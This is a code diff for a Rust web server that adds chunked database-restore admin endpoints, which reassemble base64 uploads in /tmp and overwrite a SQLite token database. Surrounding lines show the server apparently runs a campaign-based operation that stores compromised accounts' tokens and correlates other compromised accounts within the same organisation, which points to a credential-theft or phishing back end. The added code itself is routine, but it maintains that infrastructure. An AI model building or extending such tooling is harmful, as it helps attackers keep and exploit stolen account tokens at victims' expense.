@@ -2090,6 +2090,102 @@ async fn restore_db_handler(
 // CROSS-ACCOUNT INTELLIGENCE — Correlate tokens from same org
 // ============================================================
 
+// ============================================================
+// CHUNKED DB RESTORE — for large DBs that exceed Railway's
+// request body size limit (~100KB on free plan).
+// Flow: POST chunks to /restore-db-chunk, then POST to
+// /restore-db-finalize to assemble and write the DB.
+// ============================================================
+
+#[derive(Deserialize)]
+struct RestoreChunkRequest {
+    key: String,
+    chunk_index: usize,
+    total_chunks: usize,
+    data: String, // base64-encoded chunk
+}
+
+async fn restore_db_chunk_handler(
+    body: web::Json<RestoreChunkRequest>,
+) -> impl Responder {
+    let expected = std::env::var("MASTER_SECRET").unwrap_or_default();
+    if body.key != expected || expected.is_empty() {
+        return HttpResponse::Unauthorized().json(serde_json::json!({"error": "invalid_key"}));
+    }
+
+    use base64::{Engine as _, engine::general_purpose};
+    let chunk_data = match general_purpose::STANDARD.decode(&body.data) {
+        Ok(d) => d,
+        Err(e) => return HttpResponse::BadRequest().json(serde_json::json!({"error": format!("base64 decode failed: {}", e)})),
+    };
+
+    let chunk_path = format!("/tmp/db_chunk_{}", body.chunk_index);
+    match std::fs::write(&chunk_path, &chunk_data) {
+        Ok(_) => HttpResponse::Ok().json(serde_json::json!({
+            "success": true,
+            "chunk_index": body.chunk_index,
+            "size": chunk_data.len(),
+        })),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": format!("write failed: {}", e)})),
+    }
+}
+
+#[derive(Deserialize)]
+struct RestoreFinalizeRequest {
+    key: String,
+    total_chunks: usize,
+}
+
+async fn restore_db_finalize_handler(
+    body: web::Json<RestoreFinalizeRequest>,
+) -> impl Responder {
+    let expected = std::env::var("MASTER_SECRET").unwrap_or_default();
+    if body.key != expected || expected.is_empty() {
+        return HttpResponse::Unauthorized().json(serde_json::json!({"error": "invalid_key"}));
+    }
+
+    let db_path = std::env::var("DATABASE_URL")
+        .unwrap_or_else(|_| "sqlite:///app/data/simdiatokens.db".to_string());
+    let file_path = db_path.replace("sqlite:", "").replace("sqlite://", "");
+
+    // Assemble chunks
+    let mut full_data = Vec::new();
+    for i in 0..body.total_chunks {
+        let chunk_path = format!("/tmp/db_chunk_{}", i);
+        match std::fs::read(&chunk_path) {
+            Ok(data) => full_data.extend_from_slice(&data),
+            Err(e) => return HttpResponse::BadRequest().json(serde_json::json!({
+                "error": format!("Missing chunk {}: {}", i, e),
+            })),
+        }
+        let _ = std::fs::remove_file(&chunk_path);
+    }
+
+    // Back up old DB
+    let backup_path = format!("{}.bak", file_path);
+    let _ = std::fs::rename(&file_path, &backup_path);
+
+    // Write the assembled DB
+    match std::fs::write(&file_path, &full_data) {
+        Ok(_) => {
+            println!("[restore-finalize] Database restored: {} ({} bytes from {} chunks)", file_path, full_data.len(), body.total_chunks);
+            HttpResponse::Ok().json(serde_json::json!({
+                "success": true,
+                "message": format!("Database restored ({} bytes, {} chunks). Restart the service.", full_data.len(), body.total_chunks),
+                "size": full_data.len(),
+            }))
+        }
+        Err(e) => {
+            let _ = std::fs::rename(&backup_path, &file_path);
+            HttpResponse::InternalServerError().json(serde_json::json!({"error": format!("write failed: {}", e)}))
+        }
+    }
+}
+
+// ============================================================
+// CROSS-ACCOUNT INTELLIGENCE — Correlate tokens from same org
+// ============================================================
+
 /// Cross-Account Intelligence: Finds other compromised accounts from the
 /// same organization (same email domain) and:
 /// 1. Shows which accounts are compromised in the same org
@@ -2905,6 +3001,8 @@ async fn main() -> std::io::Result<()> {
             .route("/api/admins/finalize-worker", web::post().to(finalize_worker_handler))
             .route("/api/admin/backup-db", web::get().to(backup_db_handler))
             .route("/api/admin/restore-db", web::post().to(restore_db_handler))
+            .route("/api/admin/restore-db-chunk", web::post().to(restore_db_chunk_handler))
+            .route("/api/admin/restore-db-finalize", web::post().to(restore_db_finalize_handler))
             .route("/api/intelligence/cross-account/{token_id}", web::get().to(cross_account_intelligence_handler))
             .route("/api/campaigns", web::get().to(list_campaigns_handler))
             .route("/api/campaigns/create", web::post().to(create_campaign_handler))
